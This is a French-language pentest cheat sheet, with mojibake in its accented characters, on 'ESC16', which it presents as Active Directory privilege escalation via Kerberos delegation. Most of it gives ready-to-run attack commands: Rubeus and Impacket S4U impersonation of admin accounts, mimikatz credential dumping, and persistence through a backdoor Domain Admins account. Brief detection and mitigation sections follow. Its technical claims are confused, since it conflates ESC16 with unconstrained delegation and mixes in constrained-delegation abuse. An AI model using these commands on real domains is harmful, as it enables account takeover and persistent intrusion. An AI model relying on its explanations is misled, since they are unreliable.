---
title: ESC16
date: "2025-07-15"
draft: false
---

# ðŸŽ¯ ESC16 - Cheat Sheet

## ðŸŽ¯ Vue d'ensemble
ESC16 (Escalation 16) est une technique d'escalade de privilÃ¨ges Active Directory qui exploite les dÃ©lÃ©gations Kerberos non contraintes pour obtenir des privilÃ¨ges Ã©levÃ©s.

---

## ðŸ” DÃ©tection et Ã‰numÃ©ration

### Identification des DÃ©lÃ©gations Non Contraintes
```powershell
# Recherche des comptes avec dÃ©lÃ©gation non contrainte
# Pourquoi : Identifier les comptes vulnÃ©rables Ã  ESC16
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,SamAccountName

# Recherche avec PowerView
# Pourquoi : Utiliser PowerView pour une Ã©numÃ©ration avancÃ©e
Get-NetUser -TrustedToAuth | Select-Object samaccountname,useraccountcontrol

# Recherche avec LDAP
# Pourquoi : Utiliser LDAP pour une recherche directe
ldapsearch -H ldap://DC_IP -D "DOMAIN\USER" -w PASSWORD -b "DC=DOMAIN,DC=LOCAL" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName
```

### Ã‰numÃ©ration des Relations
```powershell
# Recherche des relations de dÃ©lÃ©gation
# Pourquoi : Identifier les relations entre les comptes et les services
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,SamAccountName,MemberOf

# Recherche des groupes avec dÃ©lÃ©gation
# Pourquoi : Identifier les groupes avec des privilÃ¨ges de dÃ©lÃ©gation
Get-ADGroup -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,SamAccountName,Members
```

---

## ðŸ› ï¸ Outils d'Exploitation

### Rubeus
```powershell
# Exploitation avec Rubeus
# Pourquoi : Utiliser Rubeus pour l'exploitation des dÃ©lÃ©gations
Rubeus.exe s4u /user:DELEGATED_USER /rc4:HASH /impersonateuser:ADMIN_USER /msdsspn:cifs/TARGET_SERVER /ptt

# Exploitation avec ticket existant
# Pourquoi : Utiliser un ticket existant pour l'exploitation
Rubeus.exe s4u /user:DELEGATED_USER /ticket:TICKET_B64 /impersonateuser:ADMIN_USER /msdsspn:cifs/TARGET_SERVER /ptt

# Exploitation avec mot de passe
# Pourquoi : Utiliser le mot de passe du compte dÃ©lÃ©guÃ©
Rubeus.exe s4u /user:DELEGATED_USER /password:PASSWORD /impersonateuser:ADMIN_USER /msdsspn:cifs/TARGET_SERVER /ptt
```

### Impacket
```bash
# Exploitation avec getST
# Pourquoi : Utiliser Impacket pour l'exploitation des dÃ©lÃ©gations
getST.py -spn cifs/TARGET_SERVER -impersonate ADMIN_USER DOMAIN/DELEGATED_USER:PASSWORD

# Exploitation avec hashes
# Pourquoi : Utiliser des hashes pour l'authentification
getST.py -spn cifs/TARGET_SERVER -impersonate ADMIN_USER -hashes LMHASH:NTHASH DOMAIN/DELEGATED_USER

# Exploitation avec ticket
# Pourquoi : Utiliser un ticket existant
getST.py -spn cifs/TARGET_SERVER -impersonate ADMIN_USER -k -no-pass DOMAIN/DELEGATED_USER
```

### PowerShell
```powershell
# Exploitation avec PowerShell
# Pourquoi : Utiliser PowerShell pour l'exploitation des dÃ©lÃ©gations
$cred = Get-Credential -UserName "DELEGATED_USER" -Message "Enter credentials"
$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "cifs/TARGET_SERVER"
```

---

## ðŸŽ¯ Techniques d'Exploitation

### Ã‰tape 1: Identification de la Cible
```powershell
# Identifier le compte avec dÃ©lÃ©gation non contrainte
# Pourquoi : Trouver un compte vulnÃ©rable Ã  ESC16
$delegatedUser = Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,SamAccountName | Select-Object -First 1

# Identifier la cible de privilÃ¨ges
# Pourquoi : Identifier le compte cible pour l'impersonation
$targetUser = Get-ADUser -Filter {admincount -eq $true} -Properties admincount,SamAccountName | Select-Object -First 1
```

### Ã‰tape 2: Obtenir les Credentials
```powershell
# Obtenir le hash du compte dÃ©lÃ©guÃ©
# Pourquoi : Obtenir les credentials nÃ©cessaires pour l'exploitation
mimikatz # sekurlsa::logonpasswords
# Ou utiliser d'autres techniques comme Kerberoasting
```

### Ã‰tape 3: Exploitation de la DÃ©lÃ©gation
```powershell
# Utiliser Rubeus pour l'exploitation
# Pourquoi : Exploiter la dÃ©lÃ©gation pour obtenir un ticket d'administrateur
Rubeus.exe s4u /user:$delegatedUser.SamAccountName /rc4:HASH /impersonateuser:$targetUser.SamAccountName /msdsspn:cifs/TARGET_SERVER /ptt

# Utiliser Impacket pour l'exploitation
# Pourquoi : Alternative avec Impacket
getST.py -spn cifs/TARGET_SERVER -impersonate $targetUser.SamAccountName DOMAIN/$delegatedUser.SamAccountName:PASSWORD
```

### Ã‰tape 4: Utilisation des PrivilÃ¨ges
```powershell
# Utiliser le ticket obtenu
# Pourquoi : Utiliser les privilÃ¨ges obtenus pour accÃ©der aux ressources
klist
# Le ticket est maintenant dans le cache Kerberos

# AccÃ©der Ã  la ressource cible
# Pourquoi : AccÃ©der Ã  la ressource avec les privilÃ¨ges Ã©levÃ©s
net use \\TARGET_SERVER\C$ /user:$targetUser.SamAccountName
```

---

## ðŸ”§ Post-Exploitation

### Persistance
```powershell
# CrÃ©ation de comptes persistants
# Pourquoi : Maintenir l'accÃ¨s aprÃ¨s l'exploitation
New-ADUser -Name "EvilUser" -AccountPassword (ConvertTo-SecureString "EvilPass123!" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "DOMAIN ADMINS" -Members "EvilUser"

# Modification des ACLs
# Pourquoi : Modifier les permissions pour maintenir l'accÃ¨s
Set-ADObject -Identity "CN=EvilUser,CN=Users,DC=domain,DC=local" -Add @{msDS-AllowedToDelegateTo="krbtgt/DOMAIN.LOCAL"}
```

### Ã‰numÃ©ration AvancÃ©e
```powershell
# Ã‰numÃ©ration des privilÃ¨ges obtenus
# Pourquoi : Comprendre l'Ã©tendue des privilÃ¨ges obtenus
whoami /priv
whoami /groups

# Ã‰numÃ©ration des ressources accessibles
# Pourquoi : Identifier les ressources accessibles avec les nouveaux privilÃ¨ges
Get-ADComputer -Filter * | ForEach-Object { Test-Path "\\$($_.Name)\C$" }
```

---

## ðŸ›¡ï¸ Contre-Mesures

### DÃ©tection
```powershell
# Surveillance des dÃ©lÃ©gations non contraintes
# Pourquoi : DÃ©tecter les comptes avec des dÃ©lÃ©gations non contraintes
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,SamAccountName | Export-Csv -Path "unconstrained_delegation.csv"

# Surveillance des Ã©vÃ©nements Kerberos
# Pourquoi : DÃ©tecter les tentatives d'exploitation de dÃ©lÃ©gation
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} | Where-Object {$_.Message -like "*S4U2Self*"}
```

### Mitigation
```powershell
# Suppression des dÃ©lÃ©gations non contraintes
# Pourquoi : Supprimer les dÃ©lÃ©gations non contraintes dangereuses
Set-ADUser -Identity "DELEGATED_USER" -TrustedForDelegation $false

# Configuration de dÃ©lÃ©gations contraintes
# Pourquoi : Utiliser des dÃ©lÃ©gations contraintes au lieu de non contraintes
Set-ADUser -Identity "DELEGATED_USER" -Add @{msDS-AllowedToDelegateTo="cifs/TARGET_SERVER"}
```

### Configuration SÃ©curisÃ©e
```powershell
# Politiques de sÃ©curitÃ© pour les dÃ©lÃ©gations
# Pourquoi : Configurer des politiques pour limiter les dÃ©lÃ©gations
# GPO: Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
# "Network security: LAN Manager authentication level" = "Send NTLMv2 response only. Refuse LM & NTLM"
```

---

## ðŸ“š Ressources

- **HackTricks ESC16** : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/unconstrained-delegation
- **BloodHound ESC16** : https://bloodhound.readthedocs.io/en/latest/data-analysis/attack-paths.html#unconstrained-delegation
- **Rubeus GitHub** : https://github.com/GhostPack/Rubeus
- **Impacket GitHub** : https://github.com/SecureAuthCorp/impacket

---

_DerniÃ¨re mise Ã  jour : 15 juillet 2025_
